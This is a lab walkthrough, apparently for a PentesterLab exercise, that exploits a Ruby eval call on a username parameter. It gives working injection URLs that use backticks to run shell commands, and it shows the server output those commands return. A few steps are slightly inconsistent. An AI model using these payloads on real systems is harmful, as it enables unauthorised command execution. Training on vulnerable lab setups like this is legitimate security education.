Code Execution 05

In this exercise, we are dealing with a Ruby application as you can quickly tell by injecting a double quote in the username parameter.

Since the application is in development mode, we get a lot of details on the error. The following line is especially interesting:

@message = eval "\"Hello "+params['username']+"\""

We can see that we are injecting in a call to eval. 

* Always remember: eval is evil. 

Here, we will need to do the following:
* A double-quote " to break out of the string.
* Add a + sign for string concatenation (don't forget to URL-encode it)
* Add a call to the command ([COMMAND]) we want to run using `[COMMAND]`.
* Add another + sign for string concatenation.
* Another double-quote " to close the one that was already there.

Once we put everything together, we should be able to run the score command.

To finish this exercise, you need to run the binary (/usr/local/bin/score) with your UUID (dd19b1aa-7a48-4881-87ce-4fd3f96516f8) as first argument:
/usr/local/bin/score dd19b1aa-7a48-4881-87ce-4fd3f96516f8

You can access this exercise using the following URL: http://ptc-e43875ab-b9cfba91.libcurl.so/.
You can also use the TLS version if you're experiencing timeouts due to network filtering: https://ptl-e43875ab-b9cfba91.libcurl.so/.


Common Mistakes:

    * Make sure you replace the full netcat command with the score command followed by your UUID: /usr/local/bin/score ....

Steps:
1) Vist the given url: http://ptc-e43875ab-b9cfba91.libcurl.so/.
2) Inject with single quote (') but it don't show any error. Again inject with double quote (") now we get syntax error.
    http://ptc-e43875ab-b9cfba91.libcurl.so/?username=hacker"
3) While we're analyzing the syntax error, we get code to eval. From there we would probably able to gain code execution.
4) Now try with add plus"+" in parameter.
        http://ptc-e43875ab-b9cfba91.libcurl.so/?username=hacker"+""+"
        The objective of this exercise is to find a way to get code execution...
    Again make some changes in parameter. So it looks as:
    http://ptc-e43875ab-b9cfba91.libcurl.so/?username=hacker"+"Abhishek"+"
    Look the named"Abhishek" in parameter is reflected in this page: 
      Hello hackerAbhishek 
 
 5) Let's try to get run system http://ptc-e43875ab-b9cfba91.libcurl.so/?username=hacker"+`uname`+"
     And we get Linux as a uname. 
     Again put the code 'uname -u'. 
     Now we will get response: Hello hackerLinux 31f440e930b0 4.19.0-6-amd64 #1 SMP Debian 4.19.67-2 (2019-08-28) x86_64 GNU/Linux 
7)  Finally, replace 'uname' with '/usr/local/bin/score dd19b1aa-7a48-4881-87ce-4fd3f96516f8'.
8) Bravo!! Hello hackerExercise completed!! 

    Happy Hacking!! :) 

 


